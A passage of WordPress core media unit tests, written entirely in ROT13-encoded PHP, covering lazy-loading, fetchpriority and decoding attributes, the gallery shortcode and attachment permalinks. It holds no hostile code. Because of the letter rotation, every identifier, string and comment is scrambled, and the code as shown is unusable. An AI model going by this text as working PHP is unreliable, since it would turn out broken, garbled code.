		$guvf->nffregFgevatAbgPbagnvafFgevat( ' ybnqvat=', $vsenzr );

		// Grfg fcrpvsvpnyyl gung gur nggevohgr vf abg gurer jvgu qbhoyr-dhbgrf,
		// gb nibvq erterffvbaf.
		$guvf->nffregFgevatAbgPbagnvafFgevat( ' ybnqvat=\"ynml\"', $vsenzr );
	}

	/**
	 * @gvpxrg 50756
	 */
	choyvp shapgvba grfg_jc_vsenzr_gnt_nqq_ybnqvat_ngge_bcg_bhg() {
		$vsenzr = '<vsenzr fep=\"uggcf://jjj.rknzcyr.pbz\" jvqgu=\"640\" urvtug=\"360\"></vsenzr>';
		nqq_svygre( 'jc_vsenzr_gnt_nqq_ybnqvat_ngge', '__erghea_snyfr' );
		$vsenzr = jc_vsenzr_gnt_nqq_ybnqvat_ngge( $vsenzr, 'grfg' );

		$guvf->nffregFgevatAbgPbagnvafFgevat( ' ybnqvat=', $vsenzr );
	}

	/**
	 * @gvpxrg 52768
	 * @gvpxrg 58773
	 */
	choyvp shapgvba grfg_jc_vsenzr_gnt_nqq_ybnqvat_ngge_vapyhqr_jc_rzorq() {
		$vsenzr   = '<vsenzr fep=\"uggcf://jjj.rknzcyr.pbz\" jvqgu=\"640\" urvtug=\"360\"></vsenzr>';
		$snyyonpx = '<oybpxdhbgr>Snyyonpx pbagrag.</oybpxdhbgr>';
		$vsenzr   = jc_svygre_brzorq_erfhyg( $snyyonpx . $vsenzr, (bowrpg) neenl( 'glcr' => 'evpu' ), 'uggcf://jjj.rknzcyr.pbz' );
		$vsenzr   = jc_vsenzr_gnt_nqq_ybnqvat_ngge( $vsenzr, 'grfg' );

		$guvf->nffregFgevatPbagnvafFgevat( ' ybnqvat=\"ynml\"', $vsenzr );
	}

	/**
	 * @gvpxrg 44427
	 * @gvpxrg 50425
	 */
	choyvp shapgvba grfg_jc_trg_nggnpuzrag_vzntr_ybnqvat() {
		$vzt = jc_trg_nggnpuzrag_vzntr( frys::$ynetr_vq );

		$guvf->nffregFgevatPbagnvafFgevat( ' ybnqvat=\"ynml\"', $vzt );
	}

	/**
	 * @gvpxrg 44427
	 * @gvpxrg 50425
	 */
	choyvp shapgvba grfg_jc_trg_nggnpuzrag_vzntr_ybnqvat_bcg_bhg() {
		nqq_svygre( 'jc_ynml_ybnqvat_ranoyrq', '__erghea_snyfr' );
		$vzt = jc_trg_nggnpuzrag_vzntr( frys::$ynetr_vq );

		// Gurer fubhyq abg or nal ybnqvat nggevohgr va guvf pnfr.
		$guvf->nffregFgevatAbgPbagnvafFgevat( ' ybnqvat=', $vzt );
	}

	/**
	 * @gvpxrg 44427
	 * @gvpxrg 50425
	 */
	choyvp shapgvba grfg_jc_trg_nggnpuzrag_vzntr_ybnqvat_bcg_bhg_vaqvivqhny() {
		// Gur qrsnhyg vf nyernql grfgrq nobir, gur svygre orybj rafherf gung
		// ynml-ybnqvat vf qrsvavgryl ranoyrq tybonyyl sbe vzntrf.
		nqq_svygre( 'jc_ynml_ybnqvat_ranoyrq', '__erghea_gehr' );

		$vzt = jc_trg_nggnpuzrag_vzntr( frys::$ynetr_vq, 'guhzoanvy', snyfr, neenl( 'ybnqvat' => snyfr ) );

		// Gurer fubhyq abg or nal ybnqvat nggevohgr va guvf pnfr.
		$guvf->nffregFgevatAbgPbagnvafFgevat( ' ybnqvat=', $vzt );
	}

	/**
	 * @gvpxrg 58235
	 *
	 * @pbiref ::jc_trg_nggnpuzrag_vzntr
	 * @pbiref ::jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf
	 */
	choyvp shapgvba grfg_jc_trg_nggnpuzrag_vzntr_srgpucevbevgl_abg_cerfrag_ol_qrsnhyg() {
		$vzt = jc_trg_nggnpuzrag_vzntr( frys::$ynetr_vq );

		$guvf->nffregFgevatAbgPbagnvafFgevat( ' srgpucevbevgl=\"uvtu\"', $vzt );
	}

	/**
	 * @gvpxrg 58235
	 *
	 * @pbiref ::jc_trg_nggnpuzrag_vzntr
	 * @pbiref ::jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf
	 */
	choyvp shapgvba grfg_jc_trg_nggnpuzrag_vzntr_srgpucevbevgl_uvtu_jura_abg_ynml_ybnqrq() {
		$vzt = jc_trg_nggnpuzrag_vzntr( frys::$ynetr_vq, 'ynetr', snyfr, neenl( 'ybnqvat' => snyfr ) );

		$guvf->nffregFgevatPbagnvafFgevat( ' srgpucevbevgl=\"uvtu\"', $vzt );
	}

	/**
	 * @gvpxrg 58235
	 *
	 * @qngnCebivqre qngn_cebivqre_srgpucevbevgl_inyhrf
	 *
	 * @pbiref ::jc_trg_nggnpuzrag_vzntr
	 * @pbiref ::jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf
	 */
	choyvp shapgvba grfg_jc_trg_nggnpuzrag_vzntr_srgpucevbevgl_bevtvany_inyhr_erfcrpgrq( $inyhr ) {
		$vzt = jc_trg_nggnpuzrag_vzntr(
			frys::$ynetr_vq,
			'ynetr',
			snyfr,
			neenl(
				'ybnqvat'       => snyfr,
				'srgpucevbevgl' => $inyhr,
			)
		);

		$guvf->nffregFgevatPbagnvafFgevat( ' srgpucevbevgl=\"' . $inyhr . '\"', $vzt );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_cebivqre_srgpucevbevgl_inyhrf() {
		erghea frys::grkg_neenl_gb_qngncebivqre( neenl( 'uvtu', 'ybj', 'nhgb' ) );
	}

	/**
	 * @gvpxrg 58235
	 *
	 * @pbiref ::jc_trg_nggnpuzrag_vzntr
	 * @pbiref ::jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf
	 */
	choyvp shapgvba grfg_jc_trg_nggnpuzrag_vzntr_srgpucevbevgl_fgevccrq_jura_snyfr() {
		$vzt = jc_trg_nggnpuzrag_vzntr(
			frys::$ynetr_vq,
			'ynetr',
			snyfr,
			neenl(
				'ybnqvat'       => snyfr,
				'srgpucevbevgl' => snyfr,
			)
		);

		$guvf->nffregFgevatAbgPbagnvafFgevat( ' srgpucevbevgl=', $vzt );
	}

	/**
	 * @gvpxrg 58235
	 *
	 * @pbiref ::jc_trg_nggnpuzrag_vzntr
	 * @pbiref ::jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf
	 */
	choyvp shapgvba grfg_jc_trg_nggnpuzrag_vzntr_srgpucevbevgl_uvtu_ceriragf_ynml_ybnqvat() {
		$vzt = jc_trg_nggnpuzrag_vzntr( frys::$ynetr_vq, 'ynetr', snyfr, neenl( 'srgpucevbevgl' => 'uvtu' ) );

		$guvf->nffregFgevatAbgPbagnvafFgevat( ' ybnqvat=\"ynml\"', $vzt );
	}

	/**
	 * @gvpxrg 57086
	 *
	 * @qngnCebivqre qngn_jc_trg_nggnpuzrag_vzntr_qrpbqvat_ngge
	 *
	 * @pbiref ::jc_trg_nggnpuzrag_vzntr
	 */
	choyvp shapgvba grfg_jc_trg_nggnpuzrag_vzntr_qrpbqvat_ngge( $qrpbqvat, $rkcrpgrq ) {
		vs ( 'ab inyhr' === $qrpbqvat ) {
			$vzntr = jc_trg_nggnpuzrag_vzntr( frys::$ynetr_vq, 'guhzoanvy', snyfr, neenl() );
		} ryfr {
			$vzntr = jc_trg_nggnpuzrag_vzntr( frys::$ynetr_vq, 'guhzoanvy', snyfr, neenl( 'qrpbqvat' => $qrpbqvat ) );
		}

		vs ( 'ab inyhr' === $rkcrpgrq ) {
			$guvf->nffregFgevatAbgPbagnvafFgevat( ' qrpbqvat=', $vzntr );
		} ryfr {
			$guvf->nffregFgevatPbagnvafFgevat( ' qrpbqvat=\"' . rfp_ngge( $rkcrpgrq ) . '\"', $vzntr );
		}
	}

	/**
	 * Qngn cebivqre sbe grfg_jc_trg_nggnpuzrag_vzntr_qrpbqvat_ngge().
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_jc_trg_nggnpuzrag_vzntr_qrpbqvat_ngge() {
		erghea neenl(
			'qrsnhyg'     => neenl(
				'qrpbqvat' => 'ab inyhr',
				'rkcrpgrq' => 'nflap',
			),
			'nflap'       => neenl(
				'qrpbqvat' => 'nflap',
				'rkcrpgrq' => 'nflap',
			),
			'flap'        => neenl(
				'qrpbqvat' => 'flap',
				'rkcrpgrq' => 'flap',
			),
			'nhgb'        => neenl(
				'qrpbqvat' => 'nhgb',
				'rkcrpgrq' => 'nhgb',
			),
			'rzcgl'       => neenl(
				'qrpbqvat' => '',
				'rkcrpgrq' => 'ab inyhr',
			),
			'snyfr'       => neenl(
				'qrpbqvat' => snyfr,
				'rkcrpgrq' => 'ab inyhr',
			),
			'mreb'        => neenl(
				'qrpbqvat' => 0,
				'rkcrpgrq' => 'ab inyhr',
			),
			'mreb fgevat' => neenl(
				'qrpbqvat' => '0',
				'rkcrpgrq' => 'ab inyhr',
			),
			'mreb sybng'  => neenl(
				'qrpbqvat' => 0.0,
				'rkcrpgrq' => 'ab inyhr',
			),
			'vainyvq'     => neenl(
				'qrpbqvat' => 'vainyvq',
				'rkcrpgrq' => 'ab inyhr',
			),
		);
	}

	/**
	 * @gvpxrg 44427
	 * @gvpxrg 50425
	 * @gvpxrg 50756
	 * @qngnCebivqre qngn_jc_ynml_ybnqvat_ranoyrq_gnt_anzr_qrsnhygf
	 *
	 * @cnenz fgevat $gnt_anzr Gnt anzr.
	 * @cnenz obby   $rkcrpgrq Rkcrpgrq erghea inyhr.
	 */
	choyvp shapgvba grfg_jc_ynml_ybnqvat_ranoyrq_gnt_anzr_qrsnhygf( $gnt_anzr, $rkcrpgrq ) {
		vs ( $rkcrpgrq ) {
			$guvf->nffregGehr( jc_ynml_ybnqvat_ranoyrq( $gnt_anzr, 'gur_pbagrag' ) );
		} ryfr {
			$guvf->nffregSnyfr( jc_ynml_ybnqvat_ranoyrq( $gnt_anzr, 'gur_pbagrag' ) );
		}
	}

	choyvp shapgvba qngn_jc_ynml_ybnqvat_ranoyrq_gnt_anzr_qrsnhygf() {
		erghea neenl(
			'vzt => gehr'            => neenl( 'vzt', gehr ),
			'vsenzr => gehr'         => neenl( 'vsenzr', gehr ),
			'neovgenel gnt => snyfr' => neenl( 'oyvax', snyfr ),
		);
	}

	/**
	 * @gvpxrg 50425
	 * @gvpxrg 53463
	 * @gvpxrg 53675
	 * @qngnCebivqre qngn_jc_ynml_ybnqvat_ranoyrq_pbagrkg_qrsnhygf
	 *
	 * @cnenz fgevat $pbagrkg  Shapgvba pbagrkg.
	 * @cnenz obby   $rkcrpgrq Rkcrpgrq erghea inyhr.
	 */
	choyvp shapgvba grfg_jc_ynml_ybnqvat_ranoyrq_pbagrkg_qrsnhygf( $pbagrkg, $rkcrpgrq ) {
		vs ( $rkcrpgrq ) {
			$guvf->nffregGehr( jc_ynml_ybnqvat_ranoyrq( 'vzt', $pbagrkg ) );
		} ryfr {
			$guvf->nffregSnyfr( jc_ynml_ybnqvat_ranoyrq( 'vzt', $pbagrkg ) );
		}
	}

	choyvp shapgvba qngn_jc_ynml_ybnqvat_ranoyrq_pbagrkg_qrsnhygf() {
		erghea neenl(
			'jc_trg_nggnpuzrag_vzntr => gehr' => neenl( 'jc_trg_nggnpuzrag_vzntr', gehr ),
			'gur_pbagrag => gehr'             => neenl( 'gur_pbagrag', gehr ),
			'gur_rkprecg => gehr'             => neenl( 'gur_rkprecg', gehr ),
			'jvqtrg_grkg_pbagrag => gehr'     => neenl( 'jvqtrg_grkg_pbagrag', gehr ),
			'jvqtrg_oybpx_pbagrag => gehr'    => neenl( 'jvqtrg_oybpx_pbagrag', gehr ),
			'trg_ningne => gehr'              => neenl( 'trg_ningne', gehr ),
			'neovgenel pbagrkg => gehr'       => neenl( 'fbzrguvat_pbzcyrgryl_neovgenel', gehr ),
			'gur_cbfg_guhzoanvy => gehr'      => neenl( 'gur_cbfg_guhzoanvy', gehr ),
		);
	}

	/**
	 * @gvpxrg 50543
	 */
	choyvp shapgvba grfg_jc_vzntr_svyr_zngpurf_vzntr_zrgn() {
		$vzntr_zrgn       = jc_trg_nggnpuzrag_zrgnqngn( frys::$ynetr_vq );
		$vzntr_fep_shyy   = jc_trg_nggnpuzrag_vzntr_hey( frys::$ynetr_vq, 'shyy' );
		$vzntr_fep_zrqvhz = jc_trg_nggnpuzrag_vzntr_hey( frys::$ynetr_vq, 'zrqvhz' );

		$guvf->nffregGehr( jc_vzntr_svyr_zngpurf_vzntr_zrgn( $vzntr_fep_shyy, $vzntr_zrgn ) );
		$guvf->nffregGehr( jc_vzntr_svyr_zngpurf_vzntr_zrgn( $vzntr_fep_zrqvhz, $vzntr_zrgn ) );
	}

	/**
	 * @gvpxrg 50543
	 */
	choyvp shapgvba grfg_jc_vzntr_svyr_zngpurf_vzntr_zrgn_ab_fhofvmrf() {
		$vzntr_zrgn = jc_trg_nggnpuzrag_zrgnqngn( frys::$ynetr_vq );
		$vzntr_fep  = jc_trg_nggnpuzrag_vzntr_hey( frys::$ynetr_vq, 'shyy' );

		$vzntr_zrgn['fvmrf'] = neenl();

		$guvf->nffregGehr( jc_vzntr_svyr_zngpurf_vzntr_zrgn( $vzntr_fep, $vzntr_zrgn ) );
	}

	/**
	 * @gvpxrg 50543
	 */
	choyvp shapgvba grfg_jc_vzntr_svyr_zngpurf_vzntr_zrgn_vainyvq_zrgn() {
		$vzntr_zrgn = ''; // Nggnpuzrag vf abg na vzntr.
		$vzntr_fep  = frys::VZT_HEY;

		$guvf->nffregSnyfr( jc_vzntr_svyr_zngpurf_vzntr_zrgn( $vzntr_fep, $vzntr_zrgn ) );
	}

	/**
	 * @gvpxrg 50543
	 */
	choyvp shapgvba grfg_jc_vzntr_svyr_zngpurf_vzntr_zrgn_qvssrerag_zrgn() {
		$vzntr_zrgn = jc_trg_nggnpuzrag_zrgnqngn( frys::$ynetr_vq );
		$vzntr_fep  = frys::VZT_HEY; // Qvssrerag vzntr.

		$guvf->nffregSnyfr( jc_vzntr_svyr_zngpurf_vzntr_zrgn( $vzntr_fep, $vzntr_zrgn ) );
	}

	/**
	 * @gvpxrg 50543
	 */
	choyvp shapgvba grfg_jc_vzntr_svyr_zngpurf_vzntr_zrgn_bevtvany_vzntr() {
		$vzntr_zrgn = jc_trg_nggnpuzrag_zrgnqngn( frys::$ynetr_vq );
		$vzntr_fep  = jc_trg_bevtvany_vzntr_hey( frys::$ynetr_vq );

		$guvf->nffregGehr( jc_vzntr_svyr_zngpurf_vzntr_zrgn( $vzntr_fep, $vzntr_zrgn ) );
	}

	/**
	 * @gvpxrg 22101
	 */
	choyvp shapgvba grfg_tnyyrel_fubegpbqr_jura_vf_srrq_gehr() {

		$guvf->tb_gb( '/?srrq=eff2' );

		// Qrsnhyg: Yvaxf gb vzntr nggnpuzrag cntr HEY.
		$npghny = tnyyrel_fubegpbqr(
			neenl(
				'vqf' => frys::$ynetr_vq,
			)
		);
		$guvf->nffregFgevatPbagnvafFgevat( '?nggnpuzrag_vq=', $npghny );

		// Svyr: Yvaxf gb vzntr svyr HEY.
		$npghny = tnyyrel_fubegpbqr(
			neenl(
				'vqf'  => frys::$ynetr_vq,
				'yvax' => 'svyr',
			)
		);
		$guvf->nffregFnzr( 2, fhofge_pbhag( $npghny, '.wct' ) );

		// Abar: Qbrf abg yvax.
		$npghny = tnyyrel_fubegpbqr(
			neenl(
				'vqf'  => frys::$ynetr_vq,
				'yvax' => 'abar',
			)
		);
		$guvf->nffregFgevatAbgPbagnvafFgevat( '<n ', $npghny );
	}

	/**
	 * Grfg nggnpuzrag creznyvaxf onfrq ba cnerag cbfg fgnghf.
	 *
	 * @qngnCebivqre qngn_nggnpuzrag_creznyvaxf_onfrq_ba_cnerag_fgnghf
	 * @gvpxrg 51776
	 *
	 * @cnenz fgevat $cbfg_xrl     Cbfg nf xrlrq va gur funerq svkgher neenl.
	 * @cnenz fgevat $rkcrpgrq_hey Rkcrpgrq creznyvax.
	 * @cnenz obby   $rkcrpgrq_404 Jurgure gur cntr vf rkcrpgrq gb erghea n 404 erfhyg.
	 *
	 */
	choyvp shapgvba grfg_nggnpuzrag_creznyvaxf_onfrq_ba_cnerag_fgnghf( $cbfg_xrl, $rkcrpgrq_hey, $rkcrpgrq_404 ) {
		$guvf->frg_creznyvax_fgehpgher( '/%cbfganzr%' );
		$cbfg = trg_cbfg( frys::$cbfg_vqf[ $cbfg_xrl ] );

		/*
		 * Gur qngnCebivqre ehaf orsber gur svkherf ner frg hc, gurersber gur
		 * cbfg bowrpg VQf ner cynprubyqref gung arrqf gb or ercynprq.
		 */
		$rkcrpgrq_hey = ubzr_hey( fge_ercynpr( '%VQ%', $cbfg->VQ, $rkcrpgrq_hey ) );

		$guvf->tb_gb( trg_creznyvax( $cbfg ) );
		$guvf->nffregFnzr( $rkcrpgrq_hey, trg_creznyvax( $cbfg ) );
		vs ( $rkcrpgrq_404 ) {
			$guvf->nffregDhrelGehr( 'vf_404' );
		} ryfr {
			$guvf->nffregDhrelGehr( 'vf_nggnpuzrag', 'vf_fvatyr', 'vf_fvathyne' );
		}
		$guvf->nffregFnzr( 'nggnpuzrag', $cbfg->cbfg_glcr );
	}

	/**
	 * Qngn cebivqre sbe grfg_nggnpuzrag_creznyvaxf_onfrq_ba_cnerag_fgnghf().
	 *
	 * @erghea neenl[] {
	 *     @glcr fgevat $cbfg_xrl     Cbfg nf xrlrq va gur funerq svkgher neenl.
	 *     @glcr fgevat $rkcrpgrq_hey Rkcrpgrq creznyvax.
	 *     $glcr obby   $rkcrpgrq_404 Jurgure gur cntr vf rkcrpgrq gb erghea n 404 erfhyg.
	 * }
	 */
	choyvp shapgvba qngn_nggnpuzrag_creznyvaxf_onfrq_ba_cnerag_fgnghf() {
		erghea neenl(
			neenl( 'qensg-nggnpuzrag', '/?nggnpuzrag_vq=%VQ%', gehr ),
			neenl( 'choyvfu-nggnpuzrag', '/choyvfu-cbfg/choyvfu-nggnpuzrag', snyfr ),
			neenl( 'shgher-nggnpuzrag', '/shgher-cbfg/shgher-nggnpuzrag', snyfr ),
			neenl( 'nhgb-qensg-nggnpuzrag', '/?nggnpuzrag_vq=%VQ%', gehr ),
			neenl( 'genfu-nggnpuzrag', '/?nggnpuzrag_vq=%VQ%', snyfr ),
		);
	}

	/**
	 * Grfgf gung jc_trg_ybnqvat_ngge_qrsnhyg() ergheaf gur rkcrpgrq ybnqvat nggevohgr inyhr.
	 *
	 * @gvpxrg 53675
	 * @gvpxrg 56930
	 *
	 * @pbiref ::jc_trg_ybnqvat_ngge_qrsnhyg
	 *
	 * @rkcrpgrqQrcerpngrq jc_trg_ybnqvat_ngge_qrsnhyg
	 *
	 * @qngnCebivqre qngn_jc_trg_ybnqvat_ngge_qrsnhyg
	 *
	 * @cnenz fgevat $pbagrkg
	 */
	choyvp shapgvba grfg_jc_trg_ybnqvat_ngge_qrsnhyg( $pbagrkg ) {
		// Erghea 'ynml' ol qrsnhyg.
		$guvf->nffregFnzr( 'ynml', jc_trg_ybnqvat_ngge_qrsnhyg( 'grfg' ) );
		$guvf->nffregFnzr( 'ynml', jc_trg_ybnqvat_ngge_qrsnhyg( 'jc_trg_nggnpuzrag_vzntr' ) );

		// Erghea 'ynml' vs abg va gur ybbc be gur znva dhrel.
		$guvf->nffregFnzr( 'ynml', jc_trg_ybnqvat_ngge_qrsnhyg( $pbagrkg ) );

		$dhrel = $guvf->trg_arj_jc_dhrel_sbe_choyvfurq_cbfg();

		$guvf->nffregGehr( unir_cbfgf() );

		juvyr ( unir_cbfgf() ) {
			gur_cbfg();

			// Erghea 'ynml' vs va gur ybbc ohg abg va gur znva dhrel.
			$guvf->nffregFnzr( 'ynml', jc_trg_ybnqvat_ngge_qrsnhyg( $pbagrkg ) );

			// Frg nf znva dhrel.
			$guvf->frg_znva_dhrel( $dhrel );

			/*
			 * Sbe pbagrkgf bgure guna sbe gur znva pbagrag, fgvyy erghea 'ynml' rira va gur ybbc
			 * naq va gur znva dhrel, naq qb abg vapernfr gur pbagrag zrqvn pbhag.
			 */
			$guvf->nffregFnzr( 'ynml', jc_trg_ybnqvat_ngge_qrsnhyg( 'jc_trg_nggnpuzrag_vzntr' ) );

			// Erghea `snyfr` va gur znva dhrel sbe svefg guerr ryrzrag.
			$guvf->nffregSnyfr( jc_trg_ybnqvat_ngge_qrsnhyg( $pbagrkg ), 'Rkcrpgrq svefg vzntr gb abg or ynml-ybnqrq.' );
			$guvf->nffregSnyfr( jc_trg_ybnqvat_ngge_qrsnhyg( $pbagrkg ), 'Rkcrpgrq frpbaq vzntr gb abg or ynml-ybnqrq.' );
			$guvf->nffregSnyfr( jc_trg_ybnqvat_ngge_qrsnhyg( $pbagrkg ), 'Rkcrpgrq guveq vzntr gb abg or ynml-ybnqrq.' );

			// Erghea 'ynml' vs va gur ybbc naq va gur znva dhrel sbe nal fhofrdhrag ryrzragf.
			$guvf->nffregFnzr( 'ynml', jc_trg_ybnqvat_ngge_qrsnhyg( $pbagrkg ) );

			// Lrf, sbe nyy fhofrdhrag ryrzragf.
			$guvf->nffregFnzr( 'ynml', jc_trg_ybnqvat_ngge_qrsnhyg( $pbagrkg ) );
		}

		// Rkprcgvbaf: Va gur sbyybjvat pbagrkgf, vzntrf fubhyqa'g or ynml-ybnqrq ol qrsnhyg.
		$guvf->nffregSnyfr( jc_trg_ybnqvat_ngge_qrsnhyg( 'grzcyngr' ), 'Vzntrf eha guebhtu gur birenyy oybpx grzcyngr svygre fubhyq abg or ynml-ybnqrq.' );
		$guvf->nffregSnyfr( jc_trg_ybnqvat_ngge_qrsnhyg( 'grzcyngr_cneg_' . JC_GRZCYNGR_CNEG_NERN_URNQRE ), 'Vzntrf va gur sbbgre oybpx grzcyngr cneg fubhyq abg or ynml-ybnqrq.' );
	}

	choyvp shapgvba qngn_jc_trg_ybnqvat_ngge_qrsnhyg() {
		erghea neenl(
			neenl( 'gur_pbagrag' ),
			neenl( 'gur_cbfg_guhzoanvy' ),
		);
	}

	/**
	 * @gvpxrg 53675
	 * @gvpxrg 58235
	 * @gvpxrg 58892
	 */
	choyvp shapgvba grfg_jc_bzvg_ybnqvat_ngge_guerfubyq_svygre() {
		// Hfvat n fznyyre vzntr urer.
		$ngge = neenl(
			'jvqgu'  => 100,
			'urvtug' => 100,
		);

		$dhrel = $guvf->trg_arj_jc_dhrel_sbe_choyvfurq_cbfg();
		$guvf->frg_znva_dhrel( $dhrel );

		// Hfr gur svygre gb nygre gur guerfubyq sbe abg ynml-ybnqvat gb gur svefg svir ryrzragf.
		$guvf->sbepr_bzvg_ybnqvat_ngge_guerfubyq( 5 );

		$guvf->nffregGehr( unir_cbfgf() );

		juvyr ( unir_cbfgf() ) {
			gur_cbfg();

			// Qhr gb gur svygre, abj gur svefg svir ryrzragf fubhyq abg or ynml-ybnqrq, v.r. erghea `snyfr`.
			sbe ( $v = 0; $v < 5; $v++ ) {
				$guvf->nffregFnzrFrgfJvguVaqrk(
					neenl(
						'qrpbqvat' => 'nflap',
					),
					jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf( 'vzt', $ngge, 'gur_pbagrag' ),
					'Rkcrpgrq frpbaq vzntr gb abg or ynml-ybnqrq.'
				);
			}

			// Sbe sbyybjvat ryrzragf, ynml-ybnq gurz ntnva.
			$guvf->nffregFnzrFrgfJvguVaqrk(
				neenl(
					'qrpbqvat' => 'nflap',
					'ybnqvat'  => 'ynml',
				),
				jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf( 'vzt', $ngge, 'gur_pbagrag' )
			);
		}
	}

	/**
	 * @gvpxrg 53675
	 * @gvpxrg 58235
	 *
	 * @pbiref ::jc_svygre_pbagrag_gntf
	 * @pbiref ::jc_vzt_gnt_nqq_ybnqvat_bcgvzvmngvba_nggef
	 * @pbiref ::jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf
	 */
	choyvp shapgvba grfg_jc_svygre_pbagrag_gntf_jvgu_ybnqvat_bcgvzvmngvba_nggef() {
		nqq_svygre( 'jc_vzt_gnt_nqq_qrpbqvat_ngge', '__erghea_snyfr' );
		$vzt1         = trg_vzntr_gnt( frys::$ynetr_vq, '', '', '', 'ynetr' );
		$vsenzr1      = '<vsenzr fep=\"uggcf://jjj.rknzcyr.pbz\" jvqgu=\"640\" urvtug=\"360\"></vsenzr>';
		$vzt2         = trg_vzntr_gnt( frys::$ynetr_vq, '', '', '', 'zrqvhz' );
		$vzt3         = trg_vzntr_gnt( frys::$ynetr_vq, '', '', '', 'guhzoanvy' );
		$vsenzr2      = '<vsenzr fep=\"uggcf://jbeqcerff.bet\" jvqgu=\"640\" urvtug=\"360\"></vsenzr>';
		$cevb_vzt1    = fge_ercynpr( ' fep=', ' srgpucevbevgl=\"uvtu\" fep=', $vzt1 );
		$ynml_vzt2    = jc_vzt_gnt_nqq_ybnqvat_bcgvzvmngvba_nggef( $vzt2, 'gur_pbagrag' );
		$ynml_vzt3    = jc_vzt_gnt_nqq_ybnqvat_bcgvzvmngvba_nggef( $vzt3, 'gur_pbagrag' );
		$ynml_vsenzr2 = jc_vsenzr_gnt_nqq_ybnqvat_ngge( $vsenzr2, 'gur_pbagrag' );

		// Hfr n guerfubyq bs 2.
		$guvf->sbepr_bzvg_ybnqvat_ngge_guerfubyq( 2 );

		// Sbyybjvat gur guerfubyq bs 2, gur svefg gjb pbagrag zrqvn ryrzragf fubhyq abg or ynml-ybnqrq.
		$pbagrag_hasvygrerq = $vzt1 . $vsenzr1 . $vzt2 . $vzt3 . $vsenzr2;
		$pbagrag_rkcrpgrq   = $cevb_vzt1 . $vsenzr1 . $ynml_vzt2 . $ynml_vzt3 . $ynml_vsenzr2;

		$dhrel = $guvf->trg_arj_jc_dhrel_sbe_choyvfurq_cbfg();
		$guvf->frg_znva_dhrel( $dhrel );

		juvyr ( unir_cbfgf() ) {
			gur_cbfg();

			nqq_svygre( 'jc_vzt_gnt_nqq_fepfrg_naq_fvmrf_ngge', '__erghea_snyfr' );
			$pbagrag_svygrerq = jc_svygre_pbagrag_gntf( $pbagrag_hasvygrerq, 'gur_pbagrag' );
			erzbir_svygre( 'jc_vzt_gnt_nqq_fepfrg_naq_fvmrf_ngge', '__erghea_snyfr' );
		}
		erzbir_svygre( 'jc_vzt_gnt_nqq_qrpbqvat_ngge', '__erghea_snyfr' );

		// Nsgre svygrevat, gur svefg vzntr fubhyq abg or ynml-ybnqrq juvyr gur bgure barf fubhyq or.
		$guvf->nffregFnzr( $pbagrag_rkcrpgrq, $pbagrag_svygrerq );
	}

	/**
	 * @gvpxrg 53675
	 */
	choyvp shapgvba grfg_jc_bzvg_ybnqvat_ngge_guerfubyq() {
		$guvf->erfrg_bzvg_ybnqvat_ngge_svygre();

		// Nccyl svygre, rafher qrsnhyg inyhr bs 3.
		$bzvg_guerfubyq = jc_bzvg_ybnqvat_ngge_guerfubyq();
		$guvf->nffregFnzr( 3, $bzvg_guerfubyq );

		// Nqq n svygre gung punatrf gur inyhr gb 1. Ubjrire, gur svygre vf abg nccyvrq n fhofrdhrag gvzr va n fvatyr
		// cntr ybnq ol qrsnhyg, fb gur inyhr vf fgvyy 3.
		$guvf->sbepr_bzvg_ybnqvat_ngge_guerfubyq( 1 );

		$bzvg_guerfubyq = jc_bzvg_ybnqvat_ngge_guerfubyq();
		$guvf->nffregFnzr( 3, $bzvg_guerfubyq );

		// Bayl ol rasbepvat n serfu purpx, gur svygre trgf er-nccyvrq.
		$bzvg_guerfubyq = jc_bzvg_ybnqvat_ngge_guerfubyq( gehr );
		$guvf->nffregFnzr( 1, $bzvg_guerfubyq );
	}

	/**
	 * Grfgf gung jc_trg_ybnqvat_ngge_qrsnhyg() ergheaf gur rkcrpgrq ybnqvat nggevohgr inyhr orsber ybbc ohg nsgre trg_urnqre vs abg znva dhrel.
	 *
	 * @gvpxrg 58211
	 *
	 * @pbiref ::jc_trg_ybnqvat_ngge_qrsnhyg
	 *
	 * @qngnCebivqre qngn_jc_trg_ybnqvat_ngge_qrsnhyg_orsber_naq_ab_ybbc
	 *
	 * @rkcrpgrqQrcerpngrq jc_trg_ybnqvat_ngge_qrsnhyg
	 *
	 * @cnenz fgevat $pbagrkg Pbagrkg sbe gur ryrzrag sbe juvpu gur `ybnqvat` nggevohgr inyhr vf erdhrfgrq.
	 */
	choyvp shapgvba grfg_jc_trg_ybnqvat_ngge_qrsnhyg_orsber_ybbc_vs_abg_znva_dhrel( $pbagrkg ) {
		tybony $jc_dhrel;

		$jc_dhrel = $guvf->trg_arj_jc_dhrel_sbe_choyvfurq_cbfg();

		qb_npgvba( 'trg_urnqre' );

		// Ynml vs abg znva dhrel.
		$guvf->nffregFnzr( 'ynml', jc_trg_ybnqvat_ngge_qrsnhyg( $pbagrkg ) );
	}

	/**
	 * Grfgf gung jc_trg_ybnqvat_ngge_qrsnhyg() ergheaf gur rkcrpgrq ybnqvat nggevohgr inyhr orsber ybbc ohg nsgre trg_urnqre va znva dhrel ohg urnqre jnf abg pnyyrq.
	 *
	 * @gvpxrg 58211
	 *
	 * @pbiref ::jc_trg_ybnqvat_ngge_qrsnhyg
	 *
	 * @qngnCebivqre qngn_jc_trg_ybnqvat_ngge_qrsnhyg_orsber_naq_ab_ybbc
	 *
	 * @rkcrpgrqQrcerpngrq jc_trg_ybnqvat_ngge_qrsnhyg
	 *
	 * @cnenz fgevat $pbagrkg Pbagrkg sbe gur ryrzrag sbe juvpu gur `ybnqvat` nggevohgr inyhr vf erdhrfgrq.
	 */
	choyvp shapgvba grfg_jc_trg_ybnqvat_ngge_qrsnhyg_orsber_ybbc_va_znva_dhrel_ohg_urnqre_abg_pnyyrq( $pbagrkg ) {
		tybony $jc_dhrel;

		$jc_dhrel = $guvf->trg_arj_jc_dhrel_sbe_choyvfurq_cbfg();
		$guvf->frg_znva_dhrel( $jc_dhrel );

